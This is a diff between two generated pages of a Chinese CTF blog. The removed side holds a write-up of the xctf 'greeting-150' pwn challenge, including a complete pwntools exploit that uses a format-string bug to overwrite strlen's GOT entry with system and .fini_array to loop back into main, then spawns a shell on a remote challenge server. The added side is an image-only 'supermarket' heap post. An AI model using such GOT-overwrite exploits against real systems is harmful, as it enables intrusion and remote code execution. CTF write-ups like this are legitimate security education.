@@ -4,12 +4,24 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="greeting-150, 微凉">
-    <meta name="description" content="checksecArch:     i386-32-little
-RELRO:    No RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048">
+    <meta name="keywords" content="supermarket, 微凉">
+    <meta name="description" content="checksec
+
+run
+
+ida
+
+
+
+
+
+
+
+
+
+
+
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +33,7 @@ PIE:      No PIE (0x8048">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>greeting-150 | 微凉</title>
+    <title>supermarket | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -208,12 +220,12 @@ PIE:      No PIE (0x8048">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">greeting-150</h1>
+                    <h1 class="description center-align post-title">supermarket</h1>
                 </div>
             </div>
         </div>
@@ -333,8 +345,8 @@ PIE:      No PIE (0x8048">
                                 <span class="chip bg-color">xctf</span>
                             </a>
                         
-                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                <span class="chip bg-color">格式化字符串</span>
+                            <a href="/tags/heap/">
+                                <span class="chip bg-color">heap</span>
                             </a>
                         
                     </div>
@@ -358,7 +370,7 @@ PIE:      No PIE (0x8048">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-04
+                    2022-01-29
                 </div>
                 
 
@@ -367,7 +379,7 @@ PIE:      No PIE (0x8048">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    433
+                    3
                 </div>
                 
 
@@ -397,68 +409,23 @@ PIE:      No PIE (0x8048">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Arch:     i386-32-little
-RELRO:    No RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048000)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/29/supermarket/checksec.png" alt="image-20220129161817616" style="zoom:80%;">
 
-<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><img src="/2022/02/04/greeting-150/main.png" alt="image-20220204211040697" style="zoom:80%;">
+<h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/29/supermarket/run.png" alt="image-20220129161911430" style="zoom:67%;">
 
+<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/29/supermarket/main.png" alt="image-20220129163701594" style="zoom: 80%;">
 
+<img src="/2022/01/29/supermarket/list.png" alt="image-20220129164855649" style="zoom:80%;">
 
-<p>向v5读入64字节,读入成功后,将v5的内容输给s,之后将s直接打印,很明显,有一个格式化字符串漏洞</p>
-<img src="/2022/02/04/greeting-150/offset.png" alt="image-20220204211720694" style="zoom:80%;">
+<img src="/2022/01/29/supermarket/add.png" alt="image-20220129165142064" style="zoom:80%;">
 
-<img src="/2022/02/04/greeting-150/offset2.png" alt="image-20220204212028556" style="zoom:80%;">
+<img src="/2022/01/29/supermarket/delete.png" alt="image-20220129165228045" style="zoom:80%;">
 
-<p>从图中可以看到偏移为11和12,显然这不太正确</p>
-<img src="/2022/02/04/greeting-150/offset3.png" alt="image-20220204220527224" style="zoom:80%;">
+<img src="/2022/01/29/supermarket/list(2).png" alt="image-20220129165312585" style="zoom:80%;">
 
-<p>经过测试,偏移为12,而且我们需要在前面填充2个字符</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>用格式化字符串漏洞修改strlen或其他函数(能被调用且有可操纵字符串传入的函数)的got表为system函数的plt地址以及.fini_array的4个字节为start地址,进而程序进入第二次循环,输入”/bin/sh\x00”,getshell.</p>
-<p>覆写.fini_array原理:在main函数前会调用.init段代码和.init_array段的函数数组中的每一个函数指针,同样的,main函数结束后也会调用.fini段代码和.fini._array段的函数数组中的每一个函数指针.而我们的目标就是修改.fini_array数组的第一个元素为start.</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#coding:utf8
-from pwn import *
-context(os='linux',arch='i386',log_level='debug')
-local = 0
-elf = ELF("./greeting-150")
-if local:
-    r = process("./greeting-150")
-else:
-    r = remote("111.200.241.244",58226)
-    
-strlen_got = 0x08049A54
-fini_got = 0x08049934
-main_addr = 0x080485ED
-system_plt = 0x08048490
-#start_addr = 0x080484F0
-#可以看出,这几个地址只有后两个字节不同
+<img src="/2022/01/29/supermarket/change.png" alt="image-20220129165541038" style="zoom:80%;">
 
-r.recvuntil("Please tell me your name... ")
-
-payload = b'a'*2
-payload += p32(strlen_got)
-payload += p32(strlen_got+2)
-payload += p32(fini_got)
-arr = [0x85ED,0x8490,0x804]
-num = arr[2]-32
-payload += '%' + str(num)+ 'c%13$hn' #修改strlen_got内容得前两个字节
-num = arr[1]-arr[2]
-payload += '%' + str(num) + 'c%12$hn' #修改strlen_got内容的后两个字节
-num = arr[0] - arr[1] 
-payload += '%'+ str(num) + 'c%14$hn' #修改fini的后两个字节
-print(len(payload))
-r.sendline(payload)
-r.recvuntil("Please tell me your name... ")
-r.sendline("/bin/sh\x00")
-r.interactive()
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
+<img src="/2022/01/29/supermarket/changedes.png" alt="image-20220129165733160" style="zoom:80%;">
                 
             </div>
             <hr/>
@@ -484,7 +451,7 @@ r.interactive()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/02/04/greeting-150/">https://breeze-666.github.io/2022/02/04/greeting-150/</a>
+                    <a href="https://breeze-666.github.io/2022/01/29/supermarket/">https://breeze-666.github.io/2022/01/29/supermarket/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -526,8 +493,8 @@ r.interactive()
                                     <span class="chip bg-color">xctf</span>
                                 </a>
                             
-                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                    <span class="chip bg-color">格式化字符串</span>
+                                <a href="/tags/heap/">
+                                    <span class="chip bg-color">heap</span>
                                 </a>
                             
                         </div>
@@ -577,13 +544,13 @@ r.interactive()
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/02/05/recho/">
+                <a href="/2022/02/04/greeting-150/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Recho">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="greeting-150">
                         
-                        <span class="card-title">Recho</span>
+                        <span class="card-title">greeting-150</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -594,7 +561,7 @@ r.interactive()
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-04
                         </span>
                         <span class="publish-author">
                             
@@ -615,8 +582,8 @@ r.interactive()
                         <span class="chip bg-color">xctf</span>
                     </a>
                     
-                    <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                        <span class="chip bg-color">格式化字符串</span>
                     </a>
                     
                 </div>
@@ -630,13 +597,13 @@ r.interactive()
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/29/supermarket/">
+                <a href="/2022/01/28/pwn100/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="supermarket">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="pwn-100">
                         
-                        <span class="card-title">supermarket</span>
+                        <span class="card-title">pwn-100</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -647,16 +614,12 @@ r.interactive()
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-28
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            微凉
                             
                         </span>
                     </div>
@@ -666,10 +629,6 @@ r.interactive()
                     
                     <a href="/tags/xctf/">
                         <span class="chip bg-color">xctf</span>
-                    </a>
-                    
-                    <a href="/tags/heap/">
-                        <span class="chip bg-color">heap</span>
                     </a>
                     
                 </div>
